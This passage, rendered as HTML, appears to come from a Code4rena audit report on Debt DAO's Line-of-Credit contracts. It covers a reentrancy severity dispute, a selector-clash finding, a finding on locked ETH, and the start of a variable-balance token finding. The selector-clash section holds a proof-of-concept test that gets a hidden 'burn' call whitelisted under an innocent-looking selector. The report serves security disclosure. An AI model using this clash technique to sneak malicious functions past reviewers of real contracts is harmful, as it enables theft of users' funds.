href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L388\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L388</a></p>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L488\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L488</a></p>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L173\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L173</a></p>\n<h3 id=\"tools-used-5\" style=\"position:relative;\"><a href=\"#tools-used-5\" aria-label=\"tools used 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VS Code</p>\n<h3 id=\"recommended-mitigation-steps-11\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-11\" aria-label=\"recommended mitigation steps 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Add reentrancy protection on <code>close()</code> function.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/176#issuecomment-1318478806\">dmvt (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>Has external requirements making the report Medium risk, not High.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/176#issuecomment-1332386899\">kibagateaux (Debt DAO) commented</a>:</strong></p>\n<blockquote>\n<p>Could be marked as “Acknowledged”. At the end of the day Borrowers and Lenders agree to which tokens to use, Debt DAO has no part in decision.</p>\n<p>In my opinion it’s not valid to say “If you add malicious things, malicious things happen”. If I didn’t want token reentrancy attacks, I simply wouldn’t add tokens with explicit arbitrary reentrancy abilities. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/176#issuecomment-1340035461\">dmvt (judge) commented</a>:</strong></p>\n<blockquote>\n<p>I think the sponsor misunderstands something fundamental about the way reentrancy attacks happen. The token itself isn’t malicious. It’s the external calls the token makes as part of its normal interaction that <em>can be made</em>, but are not necessarily, malicious. Issue stands.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-07-whitelisted-functions-arent-scoped-to-revenue-contracts-and-may-lead-to-unnoticed-calls-due-to-selector-clashing\" style=\"position:relative;\"><a href=\"#m-07-whitelisted-functions-arent-scoped-to-revenue-contracts-and-may-lead-to-unnoticed-calls-due-to-selector-clashing\" aria-label=\"m 07 whitelisted functions arent scoped to revenue contracts and may lead to unnoticed calls due to selector clashing permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/312\">[M-07] Whitelisted functions aren’t scoped to revenue contracts and may lead to unnoticed calls due to selector clashing</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/312\">adriro</a>, also found by <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/474\">berndartmueller</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/285\">bin2chen</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/276\">Jeiwan</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/180\">Ruhum</a>, and <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/71\">rvierdiiev</a></em></p>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/utils/SpigotLib.sol#L67\">https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/utils/SpigotLib.sol#L67</a></p>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/utils/SpigotLib.sol#L14\">https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/utils/SpigotLib.sol#L14</a></p>\n<p>Whitelisted functions in the Spigot contract don’t have any kind of association or validation to which revenue contract they are intended to be used. This may lead to inadvertently whitelisting a function in another revenue contract that has the same selector but a different name (signature).</p>\n<h3 id=\"impact-9\" style=\"position:relative;\"><a href=\"#impact-9\" aria-label=\"impact 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Functions in Solidity are represented by the first 4 bytes of the keccak hash of the function signature (name + argument types). It is possible (and not difficult) to find different functions that have the same selector.</p>\n<p>In this way, a bad actor can try to use an innocent looking function that matches the selector of another function (in a second revenue contract) that has malicious intentions. The arbiter will review the innocent function, whitelist its selector, while unknowingly enabling a potential call to the malicious function, since whitelisted functions can be called on any revenue contract.</p>\n<p>Mining for selector clashing is feasible since selectors are 4 bytes and the search space isn’t that big for current hardware.</p>\n<p>This is similar to the attack found on proxies, documented <a href=\"https://medium.com/nomic-foundation-blog/malicious-backdoors-in-ethereum-proxies-62629adf3357\">here</a> and <a href=\"https://forum.openzeppelin.com/t/beware-of-the-proxy-learn-how-to-exploit-function-clashing/1070\">here</a>.</p>\n<h3 id=\"proof-of-concept-12\" style=\"position:relative;\"><a href=\"#proof-of-concept-12\" aria-label=\"proof of concept 12 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>In the following test, the <code>collate_propagate_storage(bytes16)</code> function is whitelisted because it looks safe enough to the arbiter. Now, <code>collate_propagate_storage(bytes16)</code> has the same selector as <code>burn(uint256)</code>, which allows a bad actor to call <code>EvilRevenueContract.burn</code> using the <code>operate</code> function of the Spigot.</p>\n<p>Note: the context for this test (setup, variables and helper functions) is similar to the one found in the file <code>Spigot.t.sol</code>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"32\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">contract InnocentRevenueContract {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function collate_propagate_storage(bytes16) external {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // It&#39;s all safe here!</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(&quot;Hey it&#39;s all good here&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">contract EvilRevenueContract {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function burn(uint256) external {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Burn the world!</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(&quot;Boom!&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">function test_WhitelistFunction_SelectorClash() public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      vm.startPrank(owner);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      spigot = new Spigot(owner, treasury, operator);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      // Arbiter looks at InnocentRevenueContract.collate_propagate_storage and thinks it&#39;s safe to whitelist it (this is a simplified version, in a real deploy this comes from the SpigotedLine contract)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      spigot.updateWhitelistedFunction(InnocentRevenueContract.collate_propagate_storage.selector, true);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      assertTrue(spigot.isWhitelisted(InnocentRevenueContract.collate_propagate_storage.selector));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      // Due to selector clashing EvilRevenueContract.burn gets whitelisted too!</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      assertTrue(spigot.isWhitelisted(EvilRevenueContract.burn.selector));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      EvilRevenueContract evil = new EvilRevenueContract();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      // ISpigot.Setting memory settings = ISpigot.Setting(90, claimPushPaymentFunc, transferOwnerFunc);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      // require(spigot.addSpigot(address(evil), settings), &quot;Failed to add spigot&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">              </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      // And we can call it through operate...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      vm.startPrank(operator);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      spigot.operate(address(evil), abi.encodeWithSelector(EvilRevenueContract.burn.selector, type(uint256).max));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span></code></pre>\n<h3 id=\"recommendation\" style=\"position:relative;\"><a href=\"#recommendation\" aria-label=\"recommendation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>Associate whitelisted functions to particular revenue contracts (for example, using a <code>mapping(address => mapping(bytes4 => bool))</code>) and validate that the selector for the call is enabled for that specific revenue contract in the <code>operate</code> function.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/312\">dmvt (judge) decreased severity to Medium</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/312#issuecomment-1405075722\">kibagateaux (Debt DAO) acknowledged</a></strong></p>\n<hr>\n<h2 id=\"m-08-mistakenly-sent-eth-could-be-locked\" style=\"position:relative;\"><a href=\"#m-08-mistakenly-sent-eth-could-be-locked\" aria-label=\"m 08 mistakenly sent eth could be locked permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/355\">[M-08] Mistakenly sent eth could be locked</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/355\">__141345__</a>, also found by <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/507\">0xSmartContract</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/445\">joestakey</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/405\">rbserver</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/388\">datapunk</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/387\">eierina</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/284\">bin2chen</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/257\">Tomo</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/201\">0xbepresent</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/104\">aphak5010</a>, and <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/89\">cloudjunky</a></em></p>\n<p>If ERC20 and eth are transferred at same time, the mistakenly sent eth will be locked.</p>\n<p>There are several functions that could be affected and cause user fund lock:</p>\n<ul>\n<li><code>addCollateral()</code></li>\n<li><code>addCredit()</code></li>\n<li><code>increaseCredit()</code></li>\n<li><code>depositAndClose()</code></li>\n<li><code>depositAndRepay()</code></li>\n<li><code>close()</code></li>\n</ul>\n<h3 id=\"proof-of-concept-13\" style=\"position:relative;\"><a href=\"#proof-of-concept-13\" aria-label=\"proof of concept 13 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>In <code>receiveTokenOrETH()</code>, different logic is used to handle ERC20 and eth transfer. However, in the ERC20 if block, mistakenly sent eth will be ignored. This part of eth will be locked in the contract.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"33\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// Line-of-Credit/contracts/utils/LineLib.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">receiveTokenOrETH</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sender</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) { </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">TransferFailed</span><span class=\"mtk1\">(); }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">Denominations</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ETH</span><span class=\"mtk1\">) { </span><span class=\"mtk3\">// ERC20</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> { </span><span class=\"mtk3\">// ETH</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) { </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">TransferFailed</span><span class=\"mtk1\">(); }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk4\">true</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-12\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-12\" aria-label=\"recommended mitigation steps 12 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>In the ERC20 part, add check for <code>msg.value</code> to ensure no eth is sent:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"34\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">Denominations</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ETH</span><span class=\"mtk1\">) { </span><span class=\"mtk3\">// ERC20</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) { </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">TransferFailed</span><span class=\"mtk1\">(); }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> { </span><span class=\"mtk3\">// ETH</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/355#issuecomment-1405077581\">kibagateaux (Debt DAO) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-09-variable-balance-erc20-support\" style=\"position:relative;\"><a href=\"#m-09-variable-balance-erc20-support\" aria-label=\"m 09 variable balance erc20 support permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/367\">[M-09] Variable balance ERC20 support</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/367\">__141345__</a>, also found by <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/525\">minhquanym</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/499\">everyanykey</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/491\">pashov</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/404\">rbserver</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/322\">Ch_301</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/300\">hansfriese</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/294\">cccz</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/287\">ladboy233</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/269\">Jeiwan</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/196\">codexploder</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/188\">Ruhum</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/186\">Bnke0x0</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/171\">ayeslick</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/123\">Lambda</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/107\">aphak5010</a>, and <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/26\">rvierdiiev</a></em></p>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L94-L96\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L94-L96</a></p>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L75-L79\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L75-L79</a></p>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L273-L280\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L273-L280</a></p>\n<p><a 